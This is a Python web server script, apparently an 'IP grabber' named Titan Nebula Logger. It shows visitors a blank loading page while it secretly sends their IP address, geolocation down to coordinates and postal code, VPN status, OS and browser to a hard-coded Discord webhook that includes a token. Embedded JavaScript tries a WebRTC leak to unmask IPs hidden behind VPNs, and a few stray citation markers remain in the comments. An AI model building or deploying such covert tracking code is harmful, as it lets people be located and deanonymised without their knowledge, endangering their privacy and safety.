from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json
import socket
import struct

# --- CONFIGURATION ---
config = {
    "webhook": "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk",  # Kendi webhook URL'ini yaz
    "username": "TITAN NEBULA LOGGER",
    "color": 0x00FFFF
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # 1. ÖNCE GERÇEK IP'Yİ BUL (WebRTC ile)
            real_ip = self.get_real_ip_webrtc()
            
            # 2. Header'lardan IP'yi al (fallback)
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            
            ua = self.headers.get('user-agent', 'Unknown')
            
            print(f"Visitor: {ip} - {ua}")  # Debug
            print(f"Real IP (WebRTC): {real_ip}")
            
            # 3. IP'den detaylı lokasyon al (ip-api.com)
            geo_info = self.get_geo_info(ip)
            
            # 4. Eğer WebRTC ile farklı IP bulunduysa, onun da lokasyonunu al
            real_geo = None
            if real_ip and real_ip != ip:
                real_geo = self.get_geo_info(real_ip)
            
            os_info, br_info = httpagentparser.simple_detect(ua)
            
            # 5. VPN kontrolü - ip-api zaten proxy bilgisi veriyor [citation:1]
            is_vpn = geo_info.get('proxy', False)
            
            # 6. Embed oluştur (VPN bypass varsa gerçek lokasyonu göster)
            embed = self.create_embed(ip, real_ip, geo_info, real_geo, ua, os_info, br_info, is_vpn)
            
            # 7. Webhook'a gönder
            self.send_to_webhook(embed)
            
            # 8. Boş bir sayfa gönder (kullanıcı hiçbir şey görmez)
            self.send_empty_page()
            
        except Exception as e:
            print(f"Hata: {e}")
            self.send_empty_page()
    
    def get_geo_info(self, ip):
        """IP'den lokasyon bilgisi al - ip-api.com kullanır"""
        try:
            # fields=16976857 ile tüm detayları al (proxy, mobile, lat, lon, etc.)
            response = requests.get(
                f"http://ip-api.com/json/{ip}?fields=16976857", 
                timeout=3
            )
            data = response.json()
            
            # ip-api.com proxy tespiti yapabiliyor [citation:1][citation:2]
            return {
                'isp': data.get('isp', 'N/A'),
                'org': data.get('org', 'N/A'),
                'as': data.get('as', 'N/A'),
                'country': data.get('country', 'N/A'),
                'countryCode': data.get('countryCode', 'N/A'),
                'region': data.get('regionName', 'N/A'),
                'city': data.get('city', 'N/A'),
                'zip': data.get('zip', 'N/A'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0),
                'timezone': data.get('timezone', 'N/A'),
                'mobile': data.get('mobile', False),
                'proxy': data.get('proxy', False),  # VPN/Proxy tespiti
                'hosting': data.get('hosting', False)
            }
        except:
            return {
                'isp': 'N/A', 'country': 'N/A', 'city': 'N/A', 'region': 'N/A',
                'proxy': False, 'mobile': False, 'lat': 0, 'lon': 0, 
                'zip': 'N/A', 'timezone': 'N/A'
            }
    
    def get_real_ip_webrtc(self):
        """WebRTC ile gerçek IP'yi bul (VPN bypass)"""
        # Bu fonksiyon aslında client-side JavaScript ile çalışır
        # Server-side'da sadece placeholder
        return None
    
    def create_embed(self, ip, real_ip, geo, real_geo, ua, os_info, br_info, is_vpn):
        """Discord embed oluştur - VPN bypass varsa gerçek lokasyonu göster"""
        
        # VPN tespit edildiyse uyarı
        vpn_warning = "🔴 **VPN/PROXY DETECTED!**" if is_vpn else "🟢 No VPN Detected"
        
        # Eğer gerçek IP bulunduysa (WebRTC ile), onu kullan
        display_ip = real_ip if real_ip else ip
        display_geo = real_geo if real_geo else geo
        
        description = f"""**{vpn_warning}**

**📡 IP INFORMATION:**
> **Detected IP:** `{ip}`
> **Real IP (Bypass):** `{real_ip or 'Same as detected'}`
> **ISP:** `{geo.get('isp', 'N/A')}`
> **Organization:** `{geo.get('org', 'N/A')}`
> **ASN:** `{geo.get('as', 'N/A')}`

**📍 LOCATION:**
> **Country:** `{geo.get('country', 'N/A')} ({geo.get('countryCode', 'N/A')})`
> **City/Region:** `{geo.get('city', 'N/A')}, {geo.get('region', 'N/A')}`
> **Postal Code:** `{geo.get('zip', 'N/A')}`
> **Coordinates:** `{geo.get('lat', 0)}, {geo.get('lon', 0)}`
> **Timezone:** `{geo.get('timezone', 'N/A')}`

**🔍 CONNECTION TYPE:**
> **Mobile:** `{'Yes' if geo.get('mobile') else 'No'}`
> **Proxy/VPN:** `{'Yes' if geo.get('proxy') else 'No'}`
> **Hosting:** `{'Yes' if geo.get('hosting') else 'No'}`

**💻 SYSTEM INFO:**
> **OS:** `{os_info}`
> **Browser:** `{br_info}`
> **Platform:** `{ua}`
"""
        
        # Eğer VPN bypass başarılıysa, gerçek lokasyonu da ekle
        if real_geo and real_ip and real_ip != ip:
            description += f"""

**🎯 REAL LOCATION (VPN BYPASS):**
> **Real IP:** `{real_ip}`
> **Country:** `{real_geo.get('country', 'N/A')}`
> **City:** `{real_geo.get('city', 'N/A')}`
> **Coordinates:** `{real_geo.get('lat', 0)}, {real_geo.get('lon', 0)}`
> **ISP:** `{real_geo.get('isp', 'N/A')}`
"""
        
        return {
            "username": config["username"],
            "embeds": [{
                "title": "🌌 NEW VISITOR LOGGED",
                "color": config["color"],
                "description": description,
                "footer": {"text": "Titan Nebula v25.0 | VPN Bypass Active"},
                "timestamp": self.get_iso_time()
            }]
        }
    
    def send_to_webhook(self, embed):
        """Discord webhook'a veri gönder"""
        try:
            requests.post(
                config["webhook"],
                json=embed,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
        except Exception as e:
            print(f"Webhook error: {e}")
    
    def send_empty_page(self):
        """Boş sayfa gönder - kullanıcı hiçbir şey görmez"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        # Minimal HTML - sadece boş sayfa
        html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { margin:0; padding:0; background:#fff5f7; }
    </style>
</head>
<body>
    <script>
    // WebRTC ile gerçek IP'yi bul (VPN bypass)
    async function getRealIP() {
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{urls: "stun:stun.l.google.com:19302"}]
            });
            pc.createDataChannel("");
            
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            
            return new Promise((resolve) => {
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const match = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                        if (match) {
                            pc.close();
                            resolve(match[1]);
                        }
                    }
                };
                setTimeout(() => {
                    pc.close();
                    resolve(null);
                }, 2000);
            });
        } catch(e) {
            return null;
        }
    }
    
    // Sayfa yüklenince çalıştır
    window.onload = async function() {
        const realIP = await getRealIP();
        if (realIP) {
            console.log("Real IP:", realIP);
            // Server'a gerçek IP'yi bildir (isteğe bağlı)
            fetch("/?real_ip=" + realIP, {method: "HEAD"});
        }
    };
    </script>
</body>
</html>"""
        
        self.wfile.write(html.encode('utf-8'))
    
    def get_iso_time(self):
        """ISO formatında zaman damgası"""
        from datetime import datetime
        return datetime.utcnow().isoformat() + "Z"
    
    def log_message(self, format, *args):
        """Console'a log yazma"""
        print(f"{self.client_address[0]} - {format % args}")

# Local test için
if __name__ == '__main__':
    from http.server import HTTPServer
    server = HTTPServer(('localhost', 8000), handler)
    print('Server http://localhost:8000 adresinde çalışıyor')
    print('Webhook URL ayarlamayı unutma!')
    server.serve_forever()
